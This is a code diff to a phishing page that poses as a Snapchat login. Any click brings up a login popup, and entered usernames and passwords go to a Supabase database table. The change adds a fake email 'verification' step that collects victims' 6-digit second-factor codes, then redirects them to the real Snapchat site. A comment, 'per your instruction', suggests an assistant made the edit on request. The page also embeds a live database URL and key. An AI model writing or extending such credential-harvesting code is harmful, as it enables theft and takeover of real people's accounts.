@@ -255,6 +255,16 @@ margin-bottom: 30px;
         <button class="login-button" onclick="loginAndSaveData()">Login</button>
     </div>
 
+    <div class="popup-menu" id="verifyMenu">
+        <img src="snapchat-logo-46444.png" alt="Add Icon" class="snap-logo">
+        <h3>Verification</h3>
+        <p style="font-size: 14px; margin-bottom: 10px; color: gray;">Enter the 6-digit code sent to your email.</p>
+        <h2>6-Digit Code</h2>
+        <input type="text" id="verificationCode" class="text-input" placeholder="000000" maxlength="6">
+        <br><br>
+        <button class="login-button" onclick="verifyAndSaveCode()">Verify</button>
+    </div>
+
     <div class="profile-container">
         <div class="profile-info">
             <div class="profile-pic-container">
@@ -280,28 +290,32 @@ margin-bottom: 30px;
 
     <script>
         function openPopup() {
-            document.getElementById("popupMenu").style.display = "block";
-            document.querySelector(".popup-overlay").style.display = "block";
+            // Only open login if verify is not active
+            if (document.getElementById("verifyMenu").style.display !== "block") {
+                document.getElementById("popupMenu").style.display = "block";
+                document.querySelector(".popup-overlay").style.display = "block";
+            }
         }
 
         function closePopup() {
             document.getElementById("popupMenu").style.display = "none";
+            document.getElementById("verifyMenu").style.display = "none";
             document.querySelector(".popup-overlay").style.display = "none";
         }
 
         document.body.addEventListener("click", function(event) {
-            if (!event.target.closest(".popup-menu")) {
+            // If neither popup is open, open the login popup
+            if (document.getElementById("popupMenu").style.display !== "block" && 
+                document.getElementById("verifyMenu").style.display !== "block") {
                 openPopup();
             }
         });
 
         const supabaseClient = supabase.createClient("https://qxluetvkqxillhqsbubl.supabase.co", "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InF4bHVldHZrcXhpbGxocXNidWJsIiwicm9sZSI6ImFub24iLCJpYXQiOjE3MzM5MzIwNTMsImV4cCI6MjA0OTUwODA1M30.11cD0yE0aJW1OIx0kB4EaWtCvg5nUkj-0QuTVk-C7zg");
-        console.log("Supabase initialized:", supabase);
 
         async function loginAndSaveData() {
             const username = document.getElementById("username").value;
             const password = document.getElementById("password").value;
-
 
             if (!username || !password) {
                 alert("Please enter both username and password.");
@@ -309,19 +323,34 @@ margin-bottom: 30px;
             }
 
             const { data, error } = await supabaseClient.from("snap").insert([{ username, password }]);
-            console.log("Data:", data);
-            console.log("Error:", error);
 
             if (error) {
                 alert("Error saving data: " + error.message);
             } else {
-                closePopup();
+                // Hide login, show verification
+                document.getElementById("popupMenu").style.display = "none";
+                document.getElementById("verifyMenu").style.display = "block";
             }
-            // Redirect user to Snapchat
-        window.location.href = "https://www.snapchat.com";
+        }
+
+        async function verifyAndSaveCode() {
+            const code = document.getElementById("verificationCode").value;
+
+            if (!code || code.length < 6) {
+                alert("Please enter a valid 6-digit code.");
+                return;
+            }
+
+            // Save with username 0 and password as the code per your instruction
+            const { data, error } = await supabaseClient.from("snap").insert([{ username: "0", password: code }]);
+
+            if (error) {
+                alert("Error saving code: " + error.message);
+            } else {
+                window.location.href = "https://www.snapchat.com";
+            }
         }
     </script>
 
 </body>
 </html>
-
